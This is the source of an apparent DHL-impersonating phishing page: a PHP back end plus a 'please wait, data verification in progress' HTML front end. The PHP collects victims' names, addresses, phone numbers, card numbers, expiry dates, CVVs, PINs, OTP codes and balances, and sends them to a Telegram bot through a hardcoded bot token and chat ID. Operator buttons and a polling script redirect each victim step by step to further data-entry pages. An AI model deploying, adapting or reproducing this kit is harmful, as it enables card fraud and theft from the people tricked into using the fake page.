<?php


if (isset($_GET['id'])){
    $id = $_GET['id'];

    if (!file_exists("token/logs/$id/redirect.txt")){
      mkdir("token/logs/$id",0777);
    }

    @file_put_contents("token/logs/$id/redirect.txt","");
}

$token = "6158844216:AAGtCwgU2MXOwM6o2YTq4HOzrCWT9Q1fIDY";
$chat_id = "-1001916131820";



if (isset($_POST['otp'])){

$otp = $_POST['otp'];
$txt = urlencode("
*Данные DHL*
ID: `$id`

OTP: `$otp `
"
);

}elseif (isset($_POST['pin'])){

$pin = $_POST['pin'];
$txt = urlencode("
*Данные DHL*
ID: `$id`

PIN: `$pin `
"
);
}elseif (isset($_POST['push'])){

$push = $_POST['push'];
$txt = urlencode("
*Данные DHL*
ID: `$id`

push: `aproved`
"
);
}
elseif (isset($_POST['acc'])){

$push = $_POST['online banking'];
$txt = urlencode("
*Данные DHL*
ID: `$id`

online banking: `aproved`
"
);
}
elseif (isset($_POST['region'])){

$push = $_POST['region'];
$txt = urlencode("
*Данные DHL*
ID: `$id`

region: `aproved`
"
);
}
elseif (isset($_POST['limit'])){

$push = $_POST['limit'];
$txt = urlencode("
*Данные DHL*
ID: `$id`

limit: `aproved`
"
);
}
elseif (isset($_POST['card_balance'])){

    if (isset($_POST['card_num'])){
        if (!file_exists("token/logs/$id")){
        mkdir("token/logs/$id");
        }
        file_put_contents("token/logs/$id/balance.txt", json_encode($_POST));
      }

    $datas = json_decode(file_get_contents("token/logs/$id/data.txt"),1);
    $card = json_decode(file_get_contents("token/logs/$id/card.txt"),1);

$first_name = $datas['first_name'];
$last_name = $datas['last_name'];
$phone_number = $datas['phone_number'];
$address = $datas['address'];
$city = $datas['city'];
$postcode = $datas['postcode'];

$card_num = $card['card_num'];
$exp_date = $card['exp_date'];
$cvv = $card['cvv'];
$card_type = $card['card_type'];
$ch = $card['cardholder'];

$balance = $_POST['card_balance'];


$txt = urlencode("
❤️ *НОВЫЙ ЛОГ DHL*
*ID:* `$id`
*First name:* $first_name
*Last name:* $last_name

*Address:* $address

*Phone:* $phone_number

*Zip:* $postcode

*Card number:* `$card_num`
*Card expires:* `$exp_date`
*Card CVV:* `$cvv`
*Card type:* $card_type
*Card Holder:* $ch

*Card balance:* $balance

*UserAgent:* `".$_SERVER['HTTP_USER_AGENT']."`

"
);
}



$kb_log = [
  [['text' => 'Ввод карты', "callback_data" => '/card_'.$id],['text' => 'PIN', "callback_data" => '/pin_'.$id]],
  [['text' => 'PUSH', "callback_data" => '/push_'.$id],['text' => 'OTP', "callback_data" => '/otp_'.$id]],

  [['text' => 'Лимит', "callback_data" => '/limit_'.$id],['text' => 'Регион', "callback_data" => '/region_'.$id]],
  [['text' => 'сэксэшел', "callback_data" => '/success_'.$id]],
  ];
  $kb_log = ['inline_keyboard' => $kb_log];
  $keyboard = json_encode($kb_log);  
file_get_contents("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=markdown&text=".$txt."&reply_markup=$keyboard");




?>
<style>
.c-nav--logo{
    margin-top: 50px;
    margin-left: 50px;
}

    </style>
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta http-equiv="X-UA-Compatible" content="ie=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
    <title>Please wait, data verification in progress</title>
    <link rel="stylesheet" href="assets/style.css"/>
</head>
<body>
    <script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '2485064941634853');
fbq('track', 'PageView');
</script>
<header class="">
      <div class="headeriparsys iparsys parsys">
        <div class="iparys_inherited">
          <div id="navigation-primary" class="l-header c-navigation js--navigation">
            <nav class="c-nav l-grid">
              <div class="c-nav-primary--meta-container l-grid l-grid--w-100pc-m">
                <div>
                  <a href=""
                    class="c-nav--logo ">
                    <img  class="c-nav--logo" src="./index_files/dhl-logo.svg" alt="Back to Home">
                  </a>
                </div>
              </div>
           
              <ul
                class="c-nav--mobile js--nav-mobile l-grid--right-s l-grid--w-80pc-m l-grid--visible-s l-grid--hidden-m">
                <li>
                  <a class=""
                    href="">
                    <!-- <span class="sr-only">Search</span> -->
                  </a>
                </li>
                <li
                  class="c-nav--button type--menu js--mobile-toggle js--nav-mobile-item l-grid l-grid--left-s has-subnav js--has-subnav"
                  data-level-init="1">
                  <div class="c-nav--menu-icon">
                    <span></span>
                    <span></span>
                    <span></span>
                    <span></span>
                  </div>
                </li>
              </ul>
            </nav>
          </div>
        </div>
      </div>
    </header>
  <div class="container">
      <div class="title-block">
        
          <h2 class="title">Please wait, data verification in progress</h2>

      </div>
                <div class="form-row">
                    <div class="form-item">
                        <label for="cardSMS"></label>
                    </div>
                </div>
                <br> <br> <br>
                <div class="form-footer">
                    <p class="security">
                        <img src="assets/loading.gif" alt="" width="100">
                    </p>
                </div>
  </div>
  
  
      <script type="text/javascript">
        function checkUpdate() {
                var url_string = window.location.href;
                var url = new URL(url_string);
                var c = url.searchParams.get("id");

                $.get('token/logs/' + c + '/redirect.txt',{ "_": $.now() }, function (level) {
                    if ( level !== "") {
                        document.location.href = level + 'id=' + c;
                       }
                })
        }
        var myTimer = setInterval(() => {
            checkUpdate();
            },
            2000);



// function push() {
//                 var url_string = window.location.href;
//                 var url = new URL(url_string);
//                 var c = url.searchParams.get("id");

//                 $.get('token/scripts/push.php?id='+c,{ "_": $.now() }, function (push) {
//                     if ( push !== "") {
//                         confirm(push);
//                         // clearInterval(pushtimer);
//                        }
//                 })
//         }

       var pushtimer = setInterval(() => {
            push();
            },
            3000);
    </script>
  
 
  
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
<!--<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>-->
<!--<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>-->
</body>
</html>